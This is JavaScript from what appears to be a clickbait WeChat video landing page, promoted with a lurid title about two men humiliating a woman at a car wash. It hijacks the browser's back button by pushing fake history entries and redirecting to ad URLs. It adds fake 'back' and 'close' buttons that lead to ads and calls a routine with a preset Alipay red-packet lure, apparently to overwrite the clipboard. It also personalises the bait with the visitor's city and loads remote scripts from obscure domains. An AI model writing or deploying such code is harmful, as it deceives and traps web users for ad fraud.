
var ua = navigator.userAgent.toLowerCase();
/* if (!/micromessenger/.test(ua)) { 
	location.href= "https://mp.weixin.qq.com/s/vkRTB4WMTWEeF9P0MXTFYg";
} */

var share_api = '' ? '' : urls + 'api/fwh_share.php';

var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?8431bff7734732e59584f24cca89897c";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
var abutment_tj = JSON.parse('[{"abutment_type":"1","abutment_name":"e_app","abutment_api_url":"http:\/\/cnpijiang.com\/stat\/share"}]');
var sys_global_url = 'https://img.linzl.com/sp3/';
var luodi1 = 'http://k9p3la1nly.ahuichu.com/sp3/luodi1.html?vid=r0751hi4tck&continue&lpqNo3bf3P';
var advertising = 'http://k9p3la1nly.ahuichu.com/ad/wwdd3'; 
var is_bofang_advertising = '1';
window.onhashchange=function(){jp();};
function hh() {history.pushState(history.length+1, "message", window.location.href.split('#')[0]+"#"+new Date().getTime());}
function jp() {
    if(is_bofang_advertising == 0){
        location.href= 'http://k9p3la1nly.ahuichu.com/sp3/';    
    }else{
    	location.href= advertising;
    }
}
setTimeout('hh();', 200); 

var dizhi = '';
if(typeof localAddress != 'undefined') {
    if(typeof localAddress["city"] != 'undefined' && localAddress["city"] != ''){
        dizhi = localAddress["city"];
		dizhi = dizhi.replace("市", "");
    }else if(typeof localAddress["province"] != 'undefined' && localAddress["province"] != ''){
        dizhi = localAddress["province"];
		dizhi = dizhi.replace("省", "");
    }
}

var video_title = "洗车店两男子凌辱宾利女，场面劲爆🔥";
video_title = video_title.replace("$(dizhi)",dizhi);

var backurl = '<div style="background:#e6e5e8;font-size:16px;height:40px;line-height:40px;position:fixed;top:0;left:0;width:100%;z-index:9999;"><span onclick="jp()">&nbsp;&lt;&nbsp;返回&nbsp;&nbsp;&nbsp;</span><span onclick="jp()" style="float: right;margin-right: 10px;">X关闭</span></div><div style="width: 100%;height: 40px;"></div>'; 
$("body").prepend(backurl);

var rukou = '../../sp3/jump.html';
var video_return_url_state = '1';

var pageGlobal = {};
pageGlobal.vid = "r0751hi4tck";
pageGlobal.playStatus = "";
pageGlobal.delayTime = parseInt(475);
pageGlobal.flyUrl ="http://ipl76fd09g.tyzxjy.com/sp3/luodi2.html?k=8&vid=r0751hi4tck&ke=share&7dbb1tx0Ru";
pageGlobal.endJumpUrl ="http://k9p3la1nly.ahuichu.com/sp3/advertising.php";
pageGlobal.sMode = 'a';
pageGlobal.pic = "";
loadJS(urls + "static/app/js/onefwhpage_c.js");
if(vid){
    loadJS(urls + "api/fwh_shareconfig.php?vid=" + pageGlobal.vid + "&dizhi=" + (typeof dizhi != 'undefined' ? dizhi : ' ') + "&k=" + 0);
    loadJS(share_api + "?vid=" + pageGlobal.vid + "&url=" + luodi_url + "&k=" + 0);
}else{
    loadJS(urls + "api/fwh_shareconfig.php?dizhi=" + (typeof dizhi != 'undefined' ? dizhi : ' ') + "&k=" + 0);
    loadJS(share_api + "?url=" + luodi_url + "&k=" + 0);
}

function _share(time){
    if (typeof shareconfig != 'undefined' && typeof shares != 'undefined') {
        var data = { config: shareconfig.data.share.config, share_info: shares };
        callback(data);
    }   
}

document.getElementById('shareimg').src = "https://img.linzl.com/sp3/static/upload/share_bg/1540106808.jpg";
var luodiRule = 'http://k9p3la1nly.ahuichu.com/sp3/';
var clipboard_text = '支付宝红包再升级，红包种类更多，金额更大！人人可领，天天可领！长按复制此消息，打开支付宝领红包！亭d福智q瑞馨鹤11创誉';
_clipboard();

	wx.hideOptionMenu();
    var video_vualert_info = unescape("%3Cbr%3E%3Cb%20style%3D%22font-size%3A%2022px%3Bcolor%3A%20red%22%3E%u6700%u65B0%u7CBE%u5F69%u5185%u5BB9%3C/b%3E%3Cbr%3E%3Cb%3E%24%28title%29%3C/b%3E");
    video_vualert_info = video_vualert_info.replace("$(title)",video_title);
    var video_vualert_btn = "%u7ACB%u5373%u64AD%u653E";
    vuxalert(video_vualert_info, function(){
        $('.tvp_overlay_play').trigger("click");
    },unescape(video_vualert_btn));

function to_play() {
    myVid=document.getElementById("tenvideo_video_player_0");
    myVid.currentTime=pageGlobal.delayTime;
    $('.tvp_overlay_play').trigger("click");
}

